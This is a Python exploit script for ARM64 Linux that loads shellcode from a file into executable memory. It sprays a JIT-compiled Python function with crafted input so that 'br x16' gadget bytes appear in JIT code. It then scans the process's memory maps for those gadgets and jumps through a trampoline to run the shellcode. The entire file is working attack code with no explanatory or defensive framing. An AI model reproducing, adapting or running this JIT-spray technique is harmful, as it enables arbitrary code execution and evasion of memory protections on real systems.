import ctypes
import mmap
import struct
import jitexecleak
from capstone import *
from multiprocessing import Process, set_start_method, current_process

# Capstone config
md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True
raw_gadgets = {
    b"\x00\x02\x1f\xd6": "br x16",
    b"\xc0\x03\x5f\xd6": "ret",
}
magic_values = [
    0x0000FFFF,
    0xFFFF0000,
    0xF0F0F0F0,
    0x0F0F0F0F,
    0xDEADBEEF,
    0xAAAAAAAA,
    0x55555555,
    0xFFFFFFFF,
]

# Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()
print(f"[+] Loaded shellcode: {len(shellcode)} bytes")

# RWX mmap shellcode
libc = ctypes.CDLL("libc.so.6")
libc.mmap.restype = ctypes.c_void_p
sc_addr = libc.mmap(None, 0x1000, 7, 0x22, -1, 0)
ctypes.memmove(sc_addr, shellcode, len(shellcode))
print(f"[+] Shellcode mmap @ 0x{sc_addr:x}")

# Trampoline for x16 setup and jump
TRAMP = (
    b"\x50\x00\x00\x58" +  # ldr x16, #8
    b"\x00\x02\x1f\xd6" +  # br x16
    struct.pack("<Q", sc_addr)
)
tramp_buf = ctypes.create_string_buffer(TRAMP)
tramp_addr = ctypes.addressof(tramp_buf)
print(f"[+] Trampoline @ 0x{tramp_addr:x} -> shellcode")

def make_combo_func(magic):
    def combo(x: int, s: str):
        acc = x
        g = b'\x00\x02\x1f\xd6'.decode('latin1')
        for i in range(3000):
            acc ^= (magic & i)
            acc += (acc << 1)
            acc &= 0x0F0F0F0F
            s += str(i)
            s = s.replace("123", g)
        return s.upper()
    return combo

def get_jit_regions():
    regions = []
    with open("/proc/self/maps") as f:
        for line in f:
            if "r-xp" in line and ("jit" in line.lower() or "[anon]" in line):
                start, end = [int(x, 16) for x in line.split()[0].split("-")]
                regions.append((start, end))
    return regions

def scan_region(start, end):
    print(f"[*] Scanning: 0x{start:x}-0x{end:x}")
    mem = ctypes.string_at(start, end - start)
    for i in range(len(mem) - 4):
        chunk = mem[i:i+4]
        if chunk in raw_gadgets and raw_gadgets[chunk] == "br x16":
            addr = start + i
            print(f"[+] Found {raw_gadgets[chunk]} @ 0x{addr:x}")
            launch_shellcode(addr)
            return

def launch_shellcode(addr):
    FUNC = ctypes.CFUNCTYPE(None)
    fn = FUNC(addr)
    print(f"[*] Jumping to br x16 gadget @ 0x{addr:x} (x16 = trampoline)")
    fn()

def spray_and_scan(magic):
    print(f"\n=== [PID {current_process().pid}] magic=0x{magic:08x} ===")
    combo = make_combo_func(magic)
    for _ in range(6000):
        combo(42, "123AA")
    try:
        _ = jitexecleak.leak_executor_jit(combo)
    except RuntimeError:
        print(f"[0x{magic:08x}] JIT failed")
        return
    for start, end in get_jit_regions():
        scan_region(start, end)

if __name__ == "__main__":
    try:
        set_start_method("fork")
    except RuntimeError:
        pass
    procs = []
    for magic in magic_values:
        p = Process(target=spray_and_scan, args=(magic,))
        p.start()
        procs.append(p)
    for p in procs:
        p.join()
